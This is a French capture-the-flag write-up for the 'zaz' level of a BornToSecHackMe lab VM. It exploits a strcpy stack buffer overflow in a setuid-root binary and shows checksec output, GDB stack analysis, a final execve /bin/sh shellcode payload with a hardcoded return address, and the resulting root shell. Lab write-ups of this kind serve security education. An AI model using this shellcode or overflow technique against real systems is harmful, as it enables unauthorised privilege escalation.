
---

# Zaz

## Introduction

Dans ce niveau, deux éléments principaux sont présents :
1. Un exécutable nommé `exploit_me` (objectif principal de l'exploitation binaire).
2. Un dossier nommé `mail` (dont le contenu n'a pas été exploré en détail).

Nous concentrerons notre attaque sur l'exécutable `exploit_me`.

## Analyse Initiale

En examinant le contenu du répertoire, nous constatons la présence de l'exécutable `exploit_me` avec les permissions suivantes :

```bash
zaz@BornToSecHackMe:~$ ls -la
total 12
drwxr-x--- 4 zaz      zaz   147 Oct 15  2015 .
drwxrwx--x 9 www-data root  126 Oct 13  2015 ..
-rwxr-x--- 1 zaz      zaz     1 Oct 15  2015 .bash_history
-rwxr-x--- 1 zaz      zaz   220 Oct  8  2015 .bash_logout
-rwxr-x--- 1 zaz      zaz  3489 Oct 13  2015 .bashrc
drwx------ 2 zaz      zaz    43 Oct 14  2015 .cache
-rwsr-s--- 1 root     zaz  4880 Oct  8  2015 exploit_me
drwxr-x--- 3 zaz      zaz   107 Oct  8  2015 mail
-rwxr-x--- 1 zaz      zaz   675 Oct  8  2015 .profile
-rwxr-x--- 1 zaz      zaz  1342 Oct 15  2015 .viminfo
```

L'exécutable `exploit_me` est exécuté avec les droits `root`. Si nous réussissons à y injecter un shellcode, nous pourrons obtenir des privilèges `root`.

## Décompilation du Code

Nous avons transféré l'exécutable sur notre machine locale pour en analyser le code. Voici le code décompilé :

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {

    char buffer[140];

    if (argc > 1) {
        strcpy(buffer, argv[1]);

        puts(buffer);

        return 0;
    }

    return 1;
}
```

### Vulnérabilité Identifiée

La fonction `strcpy` utilisée dans ce code ne protège pas contre les débordements de tampon, ce qui permet une exploitation par dépassement de mémoire. En dépassant la taille du tampon, nous pouvons injecter un shellcode.

## Vérification des Mécanismes de Sécurité

Pour analyser les mécanismes de sécurité mis en place sur l'exécutable, nous utilisons `checksec` :

```bash
- sudo apt install checksec
- checksec --file=exploit_me
```

### Résultats

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified  Fortifiable      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   66) Symbols       No    0          1exploit_me
```

### Analyse des Résultats

- **RELRO :** No RELRO  
  Aucune protection RELRO. La table GOT est vulnérable.
- **Stack Canary :** No canary found  
  Pas de canary pour protéger contre les débordements de pile.
- **NX :** NX disabled  
  La mémoire exécutable n'est pas protégée, permettant l'exécution de code injecté.
- **PIE :** No PIE  
  Le binaire n'est pas position-indépendant, facilitant les attaques.
- **RPATH / RUNPATH :** No RPATH / No RUNPATH  
  Aucun chemin spécifique pour les bibliothèques.
- **Symbols :** 66 Symbols  
  Contient 66 symboles, ce qui facilite l'analyse.
- **FORTIFY :** No  
  Pas de renforcement des fonctions critiques.

### Conclusion

L'exécutable `exploit_me` est fortement vulnérable aux attaques en raison de l'absence de protections de sécurité critiques.

## Configuration du CPU

Nous devons comprendre l'architecture de la machine cible pour gérer correctement l'injection d'adresses :

```bash
zaz@BornToSecHackMe:~$ lscpu
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
```

L'architecture est en `Little Endian`, ce qui signifie que les adresses seront interprétées à l'envers.

## Debugging avec GDB

Pour aller plus loin, nous devons trouver l'adresse de retour à écraser lors de l'exploitation. Nous lançons l'analyse avec GDB :

```bash
- gdb -q exploit_me
(gdb) info functions
```

### Fonctionnalités Clés

Voici les fonctions définies dans l'exécutable :

```
Non-debugging symbols:
0x080482b4  _init
0x08048300  strcpy
0x08048300  strcpy@plt
0x08048310  puts
0x08048310  puts@plt
0x08048320  __gmon_start__
0x08048320  __gmon_start__@plt
0x08048330  __libc_start_main
0x08048330  __libc_start_main@plt
0x08048340  _start
0x08048370  __do_global_dtors_aux
0x080483d0  frame_dummy
0x080483f4  main
0x08048440  __libc_csu_init
0x080484b0  __libc_csu_fini
0x080484b2  __i686.get_pc_thunk.bx
0x080484c0  __do_global_ctors_aux
0x080484ec  _fini
```

Ensuite, nous déassemblons la fonction `main` :

```bash
(gdb) disas main
```

Nous allons maintenant trouver l'adresse de retour en simulant l'exécution de la fonction avec un débordement de tampon.

### Simulation du Débordement

Nous utilisons GDB pour identifier l'adresse de retour après un débordement :

```bash
(gdb) b main
(gdb) r $(python -c 'print "A"*140')
(gdb) x/200x $esp
```

Cherchons un motif "AAAA" (`41414141` en hexadécimal) dans la pile :

```
0xbffff898:     0x4100656d      0x41414141      0x41414141      0x41414141
0xbffff8a8:     0x41414141      0x41414141      0x41414141      0x41414141
```

L'adresse `0xbffff8a8` semble être un bon candidat pour notre adresse de retour.

## Explication des Registres et Adresses de Retour

### Fonction du Registre ESP

Le registre ESP (Extended Stack Pointer) contient l'adresse de la pointe de la pile. En d'autres termes, il pointe toujours vers le dernier élément ajouté à la pile.

### Rôle de l'Adresse de Retour

L'adresse de retour est cruciale car elle contrôle le flux d'exécution du programme après la fin d'une fonction. Normalement, lorsque la fonction se termine, le programme consulte l'adresse de retour pour savoir où continuer son exécution.

Dans une attaque de débordement de tampon, l'objectif est d'écraser cette adresse avec une valeur que nous contrôlons (généralement l'adresse où se trouve notre shellcode). Sans l'écrasement de l'adresse de retour, le programme continuerait à exécuter le code prévu, et notre shellcode ne serait jamais exécuté.

### Comment Trouver l'Adresse de Retour

Pour identifier l'adresse de retour à écraser, nous utilisons GDB pour examiner la pile après l'injection du débordement. En utilisant la commande `x/200x $esp`, nous cherchons un motif de répétition comme `0x41414141` (qui correspond à "AAAA" en hexadécimal). Une fois cette adresse identifiée, nous pouvons l'utiliser pour rediriger l'exécution du programme vers notre shellcode.

## Création du Payload

Nous allons maintenant construire un payload pour exploiter cette vulnérabilité. Le payload doit respecter la structure suivante :

1. **Remplissage du tampon** : `"A"*119`
2. **Shellcode** : Séquence d'octets représentant les instructions du shellcode.
3. **Adresse de retour** : L'adresse de retour identifiée précédemment.

### Décomposition du Payload

1. **Remplissage du tampon ("A" * 119)** :
   - Le tampon `buffer` a une taille de 140 octets. En remplissant 119 octets avec "A" (`0x41` en hexadécimal), nous laissons 21 octets pour le shellcode et l'adresse de retour.
   
2. **Shellcode** :
   - Exemple de shellcode : `"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
   - Ce shellcode exécute `/bin/sh` en utilisant une série d'instructions d'assemblage.

3. **Adresse de retour** :
   - Identifiée comme `0xbffff8a8`, cette adresse est utilisée pour diriger l'exécution vers le début de notre shellcode. En Little Endian, elle est représentée par `"\xa8\xf8\xff\xbf"`.

### Commande Finale

Voici comment assembler le payload final :

```bash
$(python -c 'print "A"*119 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xa8\xf8\xff\xbf"')
```

### Exécution

Exécutons le payload pour obtenir un shell avec les droits root :

```bash
./exploit_me $(python -c 'print "A"*119 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xa8\xf8\xff\xbf"')
```

### Résultat

```bash
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*119 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\xa8\xf8\xff\xbf"')
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
# whoami
root
```

Nous avons réussi à obtenir un shell root.

---
